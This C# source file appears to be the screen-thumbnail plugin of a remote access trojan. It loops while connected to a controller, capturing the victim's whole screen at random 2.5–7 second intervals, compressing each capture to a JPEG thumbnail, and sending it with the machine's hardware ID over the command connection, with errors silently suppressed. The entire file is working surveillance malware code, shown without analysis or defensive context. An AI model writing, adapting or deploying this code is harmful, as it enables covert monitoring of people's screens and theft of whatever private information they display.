using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using MessagePackLib.MessagePack;

namespace Plugin.Handler
{
    public class HandleThumbnails
    {
        public HandleThumbnails()
        {
            try
            {
                Packet.ctsThumbnails?.Cancel();
                Packet.ctsThumbnails = new CancellationTokenSource();

                while (Connection.IsConnected && !Packet.ctsThumbnails.IsCancellationRequested)
                {
                    Thread.Sleep(new Random().Next(2500, 7000));
                    var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                    using (var g = Graphics.FromImage(bmp))
                    using (var memoryStream = new MemoryStream())
                    {
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                        var thumb = bmp.GetThumbnailImage(256, 256, () => false, IntPtr.Zero);
                        thumb.Save(memoryStream, ImageFormat.Jpeg);
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Pac_ket").AsString = "thumbnails";
                        msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                        msgpack.ForcePathObject("Image").SetAsBytes(memoryStream.ToArray());
                        Connection.Send(msgpack.Encode2Bytes());
                        thumb.Dispose();
                    }

                    bmp.Dispose();
                }
            }
            catch
            {
                return;
            }

            Connection.Disconnected();
        }
    }
}